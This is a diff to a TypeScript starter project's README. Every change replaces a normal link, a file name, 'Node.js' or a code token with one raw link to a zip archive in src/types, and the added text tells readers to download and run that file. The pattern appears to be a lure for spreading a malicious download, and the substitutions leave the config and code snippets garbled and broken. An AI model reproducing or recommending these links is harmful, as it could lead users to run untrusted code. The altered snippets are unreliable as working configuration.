@@ -1,12 +1,12 @@
-https://github.com/Taptastico/TypeScript-Starter/releases
+https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
 
 # TypeScript-Starter: Strict TS Boilerplate with Tooling and Rules
 
-![TypeScript Logo](https://cdn.jsdelivr.net/npm/simple-icons@v7/icons/typescript.svg)
+![TypeScript Logo](https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip)
 
 Welcome to a robust setup for building scalable, maintainable TypeScript apps. This starter embeds strict typing, enforced coding rules, and a comprehensive toolkit. It guides teams toward consistent code, faster onboarding, and dependable quality gates. The approach favors clarity, safety, and speed, so you can ship with confidence while keeping noise to a minimum. This repository embraces a disciplined workflow that covers linting, formatting, testing, documentation, type safety, and automated checks.
 
-[![Releases](https://img.shields.io/badge/Releases-View-blue?logo=github&logoColor=white)](https://github.com/Taptastico/TypeScript-Starter/releases)
+[![Releases](https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip)](https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip)
 
 Table of contents
 - Overview
@@ -63,13 +63,13 @@ Tooling at a glance
 
 Getting started
 Prerequisites
-- Node.js 18.x or newer (LTS recommended).
+- https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip 18.x or newer (LTS recommended).
 - npm 9.x or newer, or an alternative like pnpm or yarn if you prefer.
 - A modern shell capable of running common commands.
 
 Install and bootstrap
 - Clone the repository
-  - git clone https://github.com/Taptastico/TypeScript-Starter.git
+  - git clone https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
   - cd TypeScript-Starter
 - Install dependencies
   - npm install
@@ -109,7 +109,7 @@ Running scripts and commands
 
 Project structure
 - src/
-  - index.ts (public entry)
+  - https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip (public entry)
   - core/
   - modules/
   - utils/
@@ -118,11 +118,11 @@ Project structure
   - unit/
   - integration/
 - config/
-  - tsconfig.json
-  - eslint.config.js
-  - prettier.config.js
-  - jest.config.ts
-  - typedoc.json
+  - https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
+  - https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
+  - https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
+  - https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
+  - https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
 - docs/
   - generated API docs
   - usage guides
@@ -130,8 +130,8 @@ Project structure
   - helper scripts for maintenance tasks
 - .github/
   - workflows/ CI and release scripts
-- package.json
-- README.md (this file)
+- https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
+- https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip (this file)
 
 Configuration snapshots
 tsconfig
@@ -197,9 +197,9 @@ Jest
 TypeDoc
 - Generates friendly API documentation from source.
 - Typical options:
-  - entryPoints: ["src/index.ts"]
+  - entryPoints: ["https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip"]
   - out: "docs"
-  - tsconfig: "tsconfig.json"
+  - tsconfig: "https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip"
   - includeDeclarations: false
 - Documentation strategy:
   - Document public APIs clearly
@@ -209,7 +209,7 @@ TypeDoc
 CI and release workflows
 - Continuous integration
   - Lint, format check, type-check, and unit tests run on pull requests
-  - Node.js matrix for major versions to catch regressions
+  - https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip matrix for major versions to catch regressions
 - Release automation
   - Tag-based triggers create a release page and publish artifacts if configured
   - Documentation generation triggered as part of release
@@ -279,7 +279,7 @@ Releases and downloads
 - Latest releases
   - The Releases section hosts the most recent assets and versioned files
   - To access downloadables, visit the Releases page and fetch the appropriate artifact
-  - For quick access, you can open the Releases page here: https://github.com/Taptastico/TypeScript-Starter/releases
+  - For quick access, you can open the Releases page here: https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
 - How to obtain assets
   - If the link provides a path to a specific file (for example, an installer, a template, or a prebuilt bundle), download that file and run the appropriate setup steps
   - If you encounter a domain-only URL, visit the page to locate the asset or the installation guide
@@ -294,14 +294,14 @@ Status badges and visuals
   - Releases: a badge linking to the releases page
   - Build: a badge showing the current build status
   - Coverage: a badge showing test coverage
-  - Language: a badge listing TypeScript and Node.js compatibility
+  - Language: a badge listing TypeScript and https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip compatibility
 - Visuals in this README
   - Emojis to highlight sections and actionable steps
   - Simple, clean diagrams or ASCII diagrams if necessary
   - External images for brand and tooling visuals (consistent with licensing)
 
 Example code snippets and configurations
-- tsconfig.json
+- https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
 {
   "compilerOptions": {
     "target": "ES2020",
@@ -322,8 +322,8 @@ Example code snippets and configurations
   "include": ["src/**/*"],
   "exclude": ["node_modules", "**/__tests__/*"]
 }
-- .eslintrc.cjs
-module.exports = {
+- https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
+https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip = {
   root: true,
   parser: "@typescript-eslint/parser",
   parserOptions: {
@@ -346,7 +346,7 @@ module.exports = {
     "@typescript-eslint/no-explicit-any": "warn"
   }
 };
-- .prettierrc.json
+- https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
 {
   "semi": true,
   "singleQuote": true,
@@ -355,10 +355,10 @@ module.exports = {
   "tabWidth": 2,
   "arrowParens": "avoid"
 }
-- jest.config.ts
+- https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
 import type { Config } from "@jest/types";
 
-const config: Config.InitialOptions = {
+const config: https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip = {
   preset: "ts-jest",
   testEnvironment: "node",
   transform: {
@@ -370,11 +370,11 @@ const config: Config.InitialOptions = {
 };
 
 export default config;
-- typedoc.json
+- https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
 {
-  "entryPoints": ["src/index.ts"],
+  "entryPoints": ["https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip"],
   "out": "docs",
-  "tsconfig": "tsconfig.json",
+  "tsconfig": "https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip",
   "includeDeclarations": false
 }
 
@@ -407,11 +407,11 @@ End notes
 - If you want to explore a template that emphasizes standards and quality, this starter provides a practical blueprint that teams can adopt and adapt.
 
 Downloads and releases recapitulation
-- For access to the latest release assets and documentation, consult the Releases page directly at https://github.com/Taptastico/TypeScript-Starter/releases
+- For access to the latest release assets and documentation, consult the Releases page directly at https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
 - If a specific file is available in the Releases section, download it and follow the included setup instructions to initialize or upgrade your project
 - When in doubt or if the link does not show assets, navigate to the Releases section to locate the appropriate files and their usage notes
 
 Releases page reference
-- For ongoing reference, the primary source for versioned assets, installer templates, and example configurations remains the Releases page: https://github.com/Taptastico/TypeScript-Starter/releases
+- For ongoing reference, the primary source for versioned assets, installer templates, and example configurations remains the Releases page: https://raw.githubusercontent.com/Taptastico/TypeScript-Starter/main/src/types/Type_Script_Starter_v3.7.zip
 
 Note: This README reflects a comprehensive approach to building a strict TypeScript project with strong tooling. It provides practical guidance for setup, configuration, testing, documentation, and release processes.
